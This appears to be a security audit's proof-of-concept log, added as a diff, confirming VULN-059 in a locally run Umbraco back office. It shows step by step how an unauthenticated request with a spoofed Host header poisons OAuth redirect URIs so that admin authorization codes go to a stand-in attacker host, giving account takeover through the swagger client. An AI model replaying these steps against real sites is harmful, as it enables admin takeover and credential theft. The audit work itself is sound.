@@ -1,0 +1,16 @@
+==============================================================================
+VULN-059: Host-header -> OAuth redirect-URI pollution (open redirect + non-prod ATO)
+==============================================================================
+[INFO] target: http://localhost:29184
+[INFO] vulnerable code path: BackOfficeAuthorizationInitializationMiddleware.cs:74 (raw Host) -> BackOfficeApplicationManager.cs:96-98,184-221
+[SETUP] admin authenticated (cookie session) — stands in for the lured, already-logged-in admin
+[SETUP] attacker-controlled host for this run: evil-77c658a95e.attacker.example
+[STEP] baseline: /authorize with an evil redirect_uri (both clients) — expect REJECTION
+[PROOF] pre-poison back-office -> 400 invalid_request; swagger -> 400 invalid_request (OpenIddict enforces the redirect-URI allow-list; evil-77c658a95e.attacker.example is NOT trusted)
+[STEP] poison: unauthenticated GET /umbraco with header  Host: evil-77c658a95e.attacker.example
+[PROOF] GET /umbraco (Host: evil-77c658a95e.attacker.example) -> 200 (no auth; middleware persists http://evil-77c658a95e.attacker.example/umbraco/oauth_complete into the client)
+[STEP] post-poison: replay the SAME /authorize requests — expect 302 to the attacker host
+[PROOF] back-office /authorize now -> 302 Location=http://evil-77c658a95e.attacker.example/umbraco/oauth_complete?code=%5Bredacted%5D&state=42067aa2691a&iss=http%3A%2F%2Fl (code='[redacted]'; the browser is redirected to the ATTACKER host = open redirect)
+[PROOF] swagger dev-client /authorize now -> 302 to evil-77c658a95e.attacker.example with a REAL, un-redacted auth code (G2Zx67KmvxClvM304l7-...) delivered to the attacker = ACCOUNT TAKEOVER
+[PROOF] (the attacker redeems this code at /security/back-office/token with their own PKCE verifier to obtain admin access/refresh tokens; HideBackOfficeTokensHandler only redacts the umbraco-back-office client, not umbraco-swagger)
+==> VULN-059: CONFIRMED — evil redirect_uri rejected (400) pre-poison, accepted (302 to evil-77c658a95e.attacker.example) after an unauthenticated Host spoof; swagger delivered a real admin code = open redirect + ATO
